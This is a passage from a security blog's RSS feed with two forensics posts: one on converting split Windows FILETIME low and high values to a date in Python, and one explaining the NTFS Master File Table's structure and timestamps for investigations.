</span></span><span style="display:flex;"><span>  struct {
</span></span><span style="display:flex;"><span>    DWORD LowPart;
</span></span><span style="display:flex;"><span>    DWORD HighPart;
</span></span><span style="display:flex;"><span>  } DUMMYSTRUCTNAME;
</span></span><span style="display:flex;"><span>  struct {
</span></span><span style="display:flex;"><span>    DWORD LowPart;
</span></span><span style="display:flex;"><span>    DWORD HighPart;
</span></span><span style="display:flex;"><span>  } u;
</span></span><span style="display:flex;"><span>  ULONGLONG QuadPart;
</span></span><span style="display:flex;"><span>} ULARGE_INTEGER;
</span></span></code></pre></div><blockquote>
<p>The ULARGE_INTEGER structure is actually a union. If your compiler has built-in support for 64-bit integers, use the QuadPart member to store the 64-bit integer. Otherwise, use the LowPart and HighPart members to store the 64-bit integer.</p>
</blockquote>
<p>So, many softwares uses the LowPart and HighPart to store a unsigned 64 bit integer by splitting it into 32 bit each. For example <code>Notepad++</code> uses <code>originalFileLastModifTimestamp</code> as <code>LowPart</code> and
<code>originalFileLastModifTimestampHigh</code> as <code>HighPart</code> to store the FILETIME timestamps.</p>
<p>To retrieve a human readable date/time from these two parts needs some arithmatic operations.</p>
<p>A simplest way to get the original FILETIME timestamp from LowPart and HighPart is a by using the following formula.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>LowPart + 2^32 * HighPart
</span></span></code></pre></div><p>The formula does not provide a good enough precision. Meaning the retrieved value may have some deviations of minutes and seconds.</p>
<p>To retrive the precise date/time value we need to perform some bitwise operation on the <code>LowPart</code> and <code>HighPart</code> in python to convert it into it&rsquo;s original form (a 64 bit unsigned integer).</p>
<p>A FILETIME timestamp is a number in 100-nanosecond intervals that have elapsed since 12:00 A.M. January 1, 1601 Coordinated Universal Time (UTC) till the creation time of the timestamp. To get the creation time, we need to add it to the nanosecond value of the initial date (1601-01-01).</p>
<p><strong>PS: We can convert the timestamp&rsquo;s value to millisecond or second also. The retrived date/time will be in UTC, as the initial value is in UTC.</strong></p>
<p>Here&rsquo;s a simple python script to convert splitted FILETIME timestamp to human readable format.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>import datetime
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>timestamp_low = -1354503710
</span></span><span style="display:flex;"><span>timestamp_high = 31047188
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>full_timestamp = (timestamp_high &lt;&lt; 32) | (timestamp_low &amp; 0xFFFFFFFF)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(full_timestamp)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>timestamp_seconds = full_timestamp / 10**7
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(timestamp_seconds)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>converted_date_from_file_time = datetime.datetime(1601, 1, 1) + datetime.timedelta(seconds=timestamp_seconds)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(converted_date_from_file_time)
</span></span></code></pre></div><h2 id="references">References</h2>
<ul>
<li><a href="https://learn.microsoft.com/en-us/windows/win32/sysinfo/file-times">File Times</a></li>
<li><a href="https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-ularge_integer-r1">ULARGE_INTEGER union</a></li>
<li><a href="https://learn.microsoft.com/en-us/windows/win32/api/minwinbase/ns-minwinbase-filetime">FILETIME structure</a></li>
<li><a href="https://stackoverflow.com/questions/29266743/what-is-dwlowdatetime-and-dwhighdatetime">What is dwLowDateTime and dwHighDateTime</a></li>
<li><a href="https://stackoverflow.com/posts/1100288/revisions">How to create FILETIME in Win32?</a></li>
<li><a href="https://forum.hackthebox.com/t/noted-sherlock/307329/6">HTB Discussion Board</a></li>
<li><a href="https://www.epochconverter.com/ldap">LDAP, Active Directory &amp; Filetime Timestamp Converter</a></li>
</ul>
]]></description>
      
    </item>
    
    
    
    <item>
      <title>Master File Table</title>
      <link>https://hshakilst.github.io/posts/master-file-table/</link>
      <pubDate>Thu, 16 May 2024 11:20:29 +0200</pubDate>
      
      <guid>https://hshakilst.github.io/posts/master-file-table/</guid>
      <description><![CDATA[<h2 id="what-is-a-master-file-table">What is a Master File Table?</h2>
<p>The Master File Table (MFT) is a system file in the NTFS file system (having the name $MFT) that stores metadata information about all files and directories on an NTFS volume. The MFT acts as an index to all the files and directories on the volume, providing quick access to the information needed to retrieve a file.</p>
<p>Each file and directory on an NTFS volume has a unique record in the MFT, known as an MFT entry. The MFT entry contains information such as the file name, timestamps, permissions, and a pointer to the file’s data. The corresponding MFT entry is updated when a file is created or modified.</p>
<p>When a file is deleted, the corresponding MFT entry is marked as free, but the actual file data remains on the disk until it is overwritten by new data. This can be useful in data recovery scenarios, as the deleted file’s data may still be recoverable. Successful data recovery requires that the Disk regions occupied by the deleted data are not overwritten.</p>
<p><strong>Note: The MFT is stored on the NTFS volume and is an important component of the NTFS file system. The MFT must remain intact and undamaged for the file system to function properly.</strong></p>
<h2 id="why-is-the-mft-useful-for-forensics">Why is the MFT Useful for Forensics?</h2>
<ol>
<li>
<p><strong>Comprehensive Data Storage</strong>: The MFT provides a detailed record of each file, including
timestamps, permissions, and data content locations, making it invaluable for forensic
investigations.</p>
</li>
<li>
<p><strong>Recovery of Deleted Files</strong>: Even when files are deleted, their MFT entries might not be
immediately reused. This allows forensic analysts to recover details about the deleted files,
which can be crucial in legal contexts.</p>
</li>
<li>
<p><strong>Tracking File Modifications</strong>: The MFT includes multiple timestamps that record different
types of file access and modifications. This can help construct a timeline of activities on a
system, an essential aspect of forensic analysis.</p>
</li>
<li>
<p><strong>Detecting Malware and Unauthorized Access</strong>: Since the MFT records file creation and
modification details, unusual changes detected in these entries can indicate unauthorised
access or malware activity.</p>
</li>
</ol>
<h2 id="general-structure-of-mft-record">General Structure of MFT Record</h2>
<p>The structure of the Master File Table (MFT) in the NTFS file system is complex and consists of multiple records, each of which represents a file or directory on the NTFS volume. Each MFT record is 1024 bytes, making the MFT very simple to parse. An MFT record has the following general structure:</p>
<ul>
<li>
<p><strong>File Record Header</strong>: This section contains information about the record itself, including the size of the record, the offset of the update sequence, and the flags that indicate the state of the file or directory.</p>
</li>
<li>
<p><strong>File Attribute List</strong>: This section contains a list of attributes that describe the file or directory, including its name, timestamps, size, and data. Each attribute is stored as a separate structure with its format.</p>
</li>
<li>
<p><strong>Data Runs</strong>: This section describes the location of the file or directory’s data on the disk. The data runs are stored as a series of extents describing the starting cluster and the length of each contiguous data block.</p>
</li>
</ul>
<p>The exact format and structure of the MFT in NTFS can vary depending on the version of the file system in use. However, the general structure remains the same, with the File Record Header, File Attribute List, and Data Runs being the main components of each MFT entry.</p>
<p><strong>Note: It’s important to note that accessing the MFT directly can be dangerous and potentially lead to file system corruption or data loss. Before attempting to access or modify the MFT, it’s recommended to perform operations on a backup of the MFT or back up important data beforehand.</strong></p>
<h2 id="detailed-breakdown-of-mft-fields">Detailed Breakdown of MFT Fields</h2>
<ol>
<li>
<p><strong>$STANDARD_INFORMATION</strong></p>
<ul>
<li><strong>Creation Time</strong>: The date and time when the file or directory was created.</li>
<li><strong>Modification Time</strong>: The date and time when the file or directory was last modified.</li>
<li><strong>Access Time</strong>: The date and time when the file or directory was last accessed.</li>
<li><strong>Entry Modified Time</strong>: The date and time when the MFT entry itself was last modified.</li>
<li><strong>Use Case</strong>: These timestamps are vital for timeline analysis to determine the sequence of user actions and file usage.</li>
</ul>
</li>
<li>
<p><strong>$FILE_NAME</strong></p>
<ul>
<li><strong>File Name</strong>: The name of the file or directory.</li>
<li>Parent Directory: The MFT record number of the directory in which the file resides.</li>
<li><strong>Additional Timestamps</strong>: Similar to $STANDARD_INFORMATION, but specific to this attribute and sometimes used as a fallback.</li>
<li><strong>Use Case</strong>: This attribute is used to confirm the integrity of file paths and names in the system, which is crucial for tracking user movements and detecting unauthorised changes.</li>
</ul>
</li>
<li>
<p><strong>$DATA</strong></p>
<ul>
<li><strong>Actual Data or Pointer</strong>: Either the data itself for smaller files or a pointer to the data for larger files.</li>
<li><strong>Use Case</strong>: Direct analysis of file contents and data recovery, especially important in cases involving data theft or unauthorized data manipulation.</li>
</ul>
</li>
<li>
<p><strong>$LOGGED_UTILITY_STREAM</strong></p>
<ul>
<li><strong>Transactional Data</strong>: Holds data related to transactional NTFS (TxF), which logs temporary file state changes.</li>
<li><strong>Use Case</strong>: Can be used to track changes made during a transaction, useful in cases of system crashes or unexpected shutdowns to determine interim states.</li>
</ul>
</li>
<li>
<p><strong>$BITMAP</strong></p>
<ul>
<li><strong>Cluster Allocation</strong>: Maps which clusters are in use by the file.</li>
<li><strong>Use Case</strong>: Useful for recovering deleted files or reconstructing file data from clusters not overwritten by new data.</li>
</ul>
</li>
<li>
<p><strong>$SECURITY_DESCRIPTOR</strong></p>
<ul>
<li><strong>Owner ID</strong>: Identifies who owns the file.</li>
<li><strong>Permissions</strong>: Details what permissions are attached to the file (who can read, write, execute, etc.).</li>
<li><strong>Audit Settings</strong>: Specifies what operations (like access or changes) are logged by the system.</li>
<li><strong>Use Case</strong>: Critical for determining access rights and detecting potential security breaches where permissions may have been altered.</li>
</ul>
</li>
<li>
<p><strong>$VOLUME_INFORMATION</strong> (specific to the MFT entry for the volume itself)</p>
<ul>
<li><strong>Volume Serial Number</strong>: Unique identifier for the volume.</li>
<li><strong>Flags</strong>: System flags related to the volume, such as whether it’s dirty (improperly unmounted).</li>
<li><strong>Use Case</strong>: Useful in multi-disk systems to link files and activities to specific volumes, essential in systems recovery and forensic analysis across multiple drives.</li>
</ul>
</li>
<li>
<p><strong>$INDEX_ROOT</strong> and <strong>$INDEX_ALLOCATION</strong></p>
<ul>
<li><strong>Index Entries</strong>: Used in directories to index contained files for quick access.</li>
<li><strong>Use Case</strong>: Forensically important for reconstructing directory structures and understanding how data was organized and accessed, particularly in complex investigations involving numerous files and directories.</li>
</ul>
</li>
</ol>
<h2 id="timestamps">Timestamps</h2>
<p>Created (0x10) is the Standard Information (SI) creation timestamp. This can be modified by user level processes, for example, timestomping. Created (0x30) is the FileName (FN) creation timestamp.</p>
<p>Timestamps of (FN) - behave differently from timestamps of (SI). These values don&rsquo;t change or all of the values change at once. However, rename and moved in a local volume are exceptions. These processes are inherited from (SI) value then set corresponding (FN) value. For more <a href="http://www.kazamiya.net/en/NTFS_Timestamps">NTFS Timestamps</a>.</p>
<h2 id="mft-resident-files">MFT Resident Files</h2>
<p>Files that can be stored directly within the Master File Table (MFT) known as resident files. The size of this kind of files varies depending on the file, the system, and the amount of metadata stored in the MFT.</p>
<p>Generally, the more metadata associated with a file, the less space remains for storing the file&rsquo;s data itself within the MFT. While there is no strict upper limit, typically files smaller than approximately 900 bytes can be fully contained within their MFT record.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://www.geeksforgeeks.org/what-is-a-master-file-table/">GeeksForGeeks</a></li>
<li><a href="http://www.kazamiya.net/en/NTFS_Timestamps">Kazamiya</a></li>
<li><a href="BFT-Write-Up.pdf">Official Writeup BFT by Cyberjunkie &amp; Sebh24 on HTB</a></li>
</ul>
]]></description>
      
    </item>
    
    
  </channel>
</rss>
